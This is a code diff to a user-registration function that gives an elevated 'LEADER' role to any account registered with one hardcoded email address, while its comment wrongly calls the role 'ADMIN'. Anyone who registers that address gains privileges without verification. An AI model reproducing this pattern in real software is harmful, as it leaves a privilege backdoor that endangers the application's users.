@@ -29,9 +29,19 @@ export async function registerUser(formData: FormData, pathToRevalidate: string 
 
   const existingUser = await prisma.user.findUnique({ where: { email } });
   if (existingUser) return { success: false, errors: [{ message: "Email already in use" }] };
-
   const passwordHash = await hashPassword(password);
 
+  if (email === "bibijoialegal@gmail.com") {
+    // Automatically set the role to ADMIN for this specific email
+    const user = await prisma.user.create({
+      data: { name, email, passwordHash, role: "LEADER" },
+    });
+    await setSession(user);
+    revalidatePath(pathToRevalidate);
+    return { success: true, message: "Registration successful!" };
+  }
+  
+  // For all other users, default to USER role
   const user = await prisma.user.create({
     data: { name, email, passwordHash },
   });
